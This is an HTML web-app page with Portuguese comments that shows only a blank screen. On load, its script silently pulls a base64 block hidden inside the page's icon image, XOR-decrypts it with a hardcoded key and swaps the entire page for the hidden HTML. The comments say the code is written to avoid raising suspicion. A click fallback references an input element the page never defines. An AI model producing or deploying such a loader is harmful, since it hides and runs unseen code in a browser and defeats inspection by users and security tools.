<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡</title> <!-- Título minimalista e discreto -->
    <style>
        /* Tela preta absoluta e limpa, sem elementos visíveis */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #020617;
            overflow: hidden;
            cursor: default;
            user-select: none;
        }
    </style>

    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#bf953f">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="icon" sizes="192x192" href="icon-192.png">
    <link rel="icon" sizes="512x512" href="icon-512.png">
    <link rel="apple-touch-icon" href="icon-192.png">
    
</head>
<body>    
    <script>
        const chaveXorMestre = "PrincesaDiamante";
        const tagInicio = "[JDP-START]";
        const tagFim = "[JDP-END]";
        const nomeFotoAlvo = "icon-192.png";
        
        let autoFailed = false;

        // CIFRA XOR BINÁRIA
        function xorEngine(bytes, key) {
            const keyBytes = new TextEncoder().encode(key);
            const output = new Uint8Array(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                output[i] = bytes[i] ^ keyBytes[i % keyBytes.length];
            }
            return output;
        }

        // VARREDURA AUTOMÁTICA EM SEGUNDO PLANO
        async function varreduraSilenciosa() {
            try {
                const resposta = await fetch(nomeFotoAlvo);
                if (!resposta.ok) throw new Error();

                const arrayBuffer = await resposta.arrayBuffer();
                processarBytesDaFoto(new Uint8Array(arrayBuffer));
            } catch (erro) {
                // Se falhar (CORS ou arquivo ausente), ativa o gatilho de toque na tela
                autoFailed = true;
            }
        }

        // PROCESSAMENTO E SUBSTITUIÇÃO DO DOM
        function processarBytesDaFoto(bytesCarrier) {
            try {
                // Varre os últimos 10MB buscando as tags de demarcação
                const textoBytes = new TextDecoder().decode(bytesCarrier.subarray(bytesCarrier.length - 10000000));
                
                const indexInicio = textoBytes.indexOf(tagInicio);
                const indexFim = textoBytes.indexOf(tagFim);

                if (indexInicio !== -1 && indexFim !== -1) {
                    const b64Extraido = textoBytes.substring(indexInicio + tagInicio.length, indexFim);
                    
                    const binString = atob(b64Extraido);
                    const bytesCriptografados = new Uint8Array(binString.length);
                    for (let i = 0; i < binString.length; i++) {
                        bytesCriptografados[i] = binString.charCodeAt(i);
                    }

                    const bytesDescriptografados = xorEngine(bytesCriptografados, chaveXorMestre);

                    const textoDecodificadoParcial = new TextDecoder().decode(bytesDescriptografados.subarray(0, 2000));
                    const indexSeparador = textoDecodificadoParcial.indexOf("|||");

                    if (indexSeparador !== -1) {
                        const cabecalhoTexto = textoDecodificadoParcial.substring(0, indexSeparador);
                        const tamanhoCabecalhoBytes = new TextEncoder().encode(cabecalhoTexto + "|||").length;
                        const bytesArquivoFinal = bytesDescriptografados.subarray(tamanhoCabecalhoBytes);

                        const htmlFinal = new TextDecoder().decode(bytesArquivoFinal);
                        
                        // Executa a substituição do DOM sob o capô
                        document.open();
                        document.write(htmlFinal);
                        document.close();
                    }
                }
            } catch (e) {
                // Falha silenciosa para não levantar suspeitas no console
            }
        }

        // GATILHO DE TOQUE (CONTINGÊNCIA SE O NAVEGADOR BLOQUEAR O FETCH)
        document.body.addEventListener('click', () => {
            if (autoFailed) {
                document.getElementById('stealth-input').click();
            }
        });

        function processarArquivoManual(e) {
            const file = e.target.files[0];
            if (!file) return;

            const reader = new FileReader();
            reader.onload = function(evt) {
                processarBytesDaFoto(new Uint8Array(evt.target.result));
            };
            reader.readAsArrayBuffer(file);
        }

        // Inicia a varredura silenciosa imediatamente ao carregar
        window.onload = varreduraSilenciosa;
    </script>

    <script>
        if ('serviceWorker' in navigator) {
            window.addEventListener('load', () => {
                navigator.serviceWorker.register('./sw.js').then(reg => console.log('SISTEMA JDP: MOTOR ATIVO'));
            });
        }
    </script>
</body>
</html>
